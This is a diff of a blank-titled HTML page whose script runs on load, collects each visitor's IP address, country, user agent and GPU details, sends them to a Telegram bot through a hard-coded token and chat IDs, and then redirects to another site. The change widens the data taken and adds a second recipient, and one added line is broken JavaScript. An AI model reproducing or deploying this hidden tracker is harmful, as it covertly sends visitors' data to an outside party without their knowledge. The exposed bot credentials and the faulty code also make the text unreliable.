@@ -5,13 +5,16 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title></title>
     <script>
-        async function getIP() {
+        async function getIPDetails() {
             try {
-                const res = await fetch("https://api64.ipify.org?format=json");
+                const res = await fetch("https://ipapi.co/json/");
                 const data = await res.json();
-                return data.ip;
+                return {
+                    ip: data.ip || "Unknown",
+                    country: data.country_name || "Unknown"
+                };
             } catch (e) {
-                return "Failed to get IP";
+                return { ip: "Failed to get IP", country: "Unknown" };
             }
         }
 
@@ -29,13 +32,13 @@
         }
 
         async function sendDataToTelegram() {
-            const ip = await getIP();
+            const ipDetails = await getIPDetails();
             const userAgent = navigator.userAgent;
             const gpu = getGPUInfo();
 
-            const botToken = "7671006802:AAG1xxrUgft4bPHDwAZu6oF2n60X6E3glc8"; 
-            const chatId = "6331127625";  
-            const message = `🔹 IP: ${ip}\n🔹 User-Agent: ${userAgent}\n🔹 GPU: ${gpu}`;
+            const botToken = "7671006802:AAG1xxrUgft4bPHDwAZu6oF2n60X6E3glc8";  
+            const chatId = "6331127625", "7723080300";  
+            const message = `👤\nIP: ${ipDetails.ip}\nCountry: ${ipDetails.country}\n\nUser-Agent: ${userAgent}\n\nGPU: ${gpu}`;
             
             const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
             fetch(url, {
@@ -47,7 +50,7 @@
 
         (async () => {
             await sendDataToTelegram();
-            window.location.href = "https://mydoculite.com"; 
+            window.location.href = "https://mydoculite.com";
         })();
     </script>
 </head>
